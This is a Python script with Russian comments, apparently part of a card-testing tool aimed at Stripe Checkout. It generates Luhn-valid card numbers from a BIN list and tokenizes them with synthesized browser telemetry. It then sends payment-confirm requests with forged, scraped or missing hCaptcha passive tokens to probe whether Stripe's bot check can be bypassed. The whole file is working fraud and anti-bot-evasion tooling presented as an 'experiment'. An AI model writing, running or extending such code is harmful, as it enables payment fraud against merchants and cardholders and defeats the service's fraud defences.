# language: Python 3.12+, file: _audit/exp_passive_token.py, target: Windows 11
"""Эксперимент: как confirm отвечает на passive_captcha_token (только замеры).

Проверяем три тела на одной свежей сессии:
  1) мусорный токен  -> какой код ошибки у маршрута (класс отказа по значению);
  2) наш настоящий токен из checksiteconfig (c.req, префикс P1_) -> примут или нет;
  3) контроль без токена -> базовая линия 200.
Плюс отдельно: что сегодня возвращает наш gc.fetch_hcaptcha_radar_token.

Запуск: python _audit/exp_passive_token.py <файл со ссылкой>
"""
import asyncio
import json
import sys
import uuid

sys.path.insert(0, "C:/Users/Redmi/Downloads/pusto")

import config  # noqa: E402
import gate_client as gc  # noqa: E402
import hit_gate as hg  # noqa: E402



def exp_card_raw() -> str:
    """Пробник по Луну, генерируется на ходу: полного PAN в исходнике нет (правило гигиены секретов).

    Карта нужна только для проверки поведения маршрута — эмитент её всё равно отклонит без списания.
    """
    import random

    p = gc.gen_probe_card(random.choice(gc._PROBE_BINS))
    return f"{p['number']}|{p['mm']}|{p['yy']}|{p['cvc']}"


HEADERS = {"Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/", "Accept": "application/json"}


async def session_link_settings(gs):
    r = await gs.s.get(f"https://api.stripe.com/v1/payment_pages/{gs.cs}", params={"key": gs.pk}, headers=HEADERS, timeout=12)
    ls = ((r.json() or {}).get("link_settings") or {})
    return str(ls.get("hcaptcha_site_key") or ""), str(ls.get("hcaptcha_rqdata") or "")


async def our_req_token(gs, sitekey):
    """c.req из checksiteconfig: токен лежит ВНУТРИ строки c, а не ключом верхнего уровня."""
    r = await gs.s.post("https://api.hcaptcha.com/checksiteconfig",
                        params={"v": gc.STRIPE_JS_BUILD, "sitekey": sitekey, "host": "b.stripecdn.com", "sc": "1", "swa": "1"},
                        headers={"Origin": "https://b.stripecdn.com", "Referer": "https://b.stripecdn.com/", "Accept": "application/json"},
                        timeout=10)
    j = r.json() or {}
    req = None
    c = j.get("c")
    if isinstance(c, str):
        try:
            req = (json.loads(c) or {}).get("req")
        except Exception:
            req = None
    if not req:
        req = gc._find_key(j, "req")
    return req, j


async def tokenize(gs):
    pan, mm, yy, cvc = exp_card_raw().split("|")
    card = {"number": pan, "mm": mm, "yy": yy, "cvc": cvc}
    telem = gs.synthesize_telemetry()
    body = gc.tokenize_body(card, telem, gs.url.split("#")[0])
    res = await gc.tokenize_payment_method(gs.s, body, timeout=12)
    return res.get("id")


async def confirm(gs, pm_id, token, label):
    body = {"key": gs.pk, "eid": str(uuid.uuid4()), "payment_method": pm_id,
            "expected_payment_method_type": "card",
            "expected_amount": str(gs.expected_amount or gs.amount),
            "return_url": gs.url.split("#")[0]}
    if gs.checksum:
        body["init_checksum"] = gs.checksum
    if token is not None:
        body["passive_captcha_token"] = token
    r = await gs.s.post(f"https://api.stripe.com/v1/payment_pages/{gs.cs}/confirm", data=body, headers=HEADERS, timeout=20)
    try:
        j = r.json() or {}
    except Exception:
        j = {"raw": r.text[:200]}
    err = j.get("error") or {}
    pi = j.get("payment_intent") or {}
    print(f"  [{label}] http={r.status_code} code={err.get('code')!r} type={err.get('type')!r} param={err.get('param')!r}")
    if err:
        print(f"  [{label}] message={str(err.get('message'))[:150]!r}")
    else:
        print(f"  [{label}] pi={pi.get('id')} status={pi.get('status')}")
    return r.status_code, j


async def main():
    url = open(sys.argv[1], encoding="utf-8").read().strip()
    gs = hg.CsHitSession(url)
    ok, detail = await gs.open()
    print(f"open={ok} {detail} | сумма={gs.expected_amount or gs.amount}{gs.currency}")
    if not ok:
        return
    sitekey, rqdata = await session_link_settings(gs)
    print(f"sitekey сессии={sitekey} | rqdata={len(rqdata)} симв.")
    print("наш gc.fetch_hcaptcha_radar_token ->", end=" ")
    try:
        t = await gc.fetch_hcaptcha_radar_token(gs.s, gs.pk, "checkout.stripe.com")
        print(f"{type(t).__name__} len={len(t) if t else 0} prefix={str(t)[:12]!r}") 
    except Exception as e:
        print(f"ошибка {type(e).__name__}: {e}"[:120])
    req, raw = await our_req_token(gs, sitekey)
    print(f"c.req len={len(str(req)) if req else 0} prefix={str(req)[:14]!r} | pass={raw.get('pass')}")
    pm_id = await tokenize(gs)
    print(f"pm={pm_id}")
    if not pm_id:
        return
    await confirm(gs, pm_id, "P1_не_настоящий_токен_123", "мусорный токен")
    if req:
        await confirm(gs, pm_id, "P1_" + str(req).lstrip("P1_"), "наш checksiteconfig.req")
    else:
        print("  [наш checksiteconfig.req] пропущен: req не получен")
    await confirm(gs, pm_id, None, "БЕЗ токена")
    await gs.close()


asyncio.run(main())